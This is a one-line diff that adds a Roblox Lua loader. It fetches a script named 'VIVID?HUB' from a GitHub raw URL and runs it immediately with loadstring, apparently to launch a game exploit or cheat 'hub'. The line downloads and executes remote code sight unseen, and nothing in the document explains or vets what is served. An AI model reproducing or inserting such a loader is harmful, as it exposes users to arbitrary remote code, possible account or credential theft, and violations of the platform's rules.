@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ta679/g/refs/heads/main/VIVID%3FHUB.txt"))()
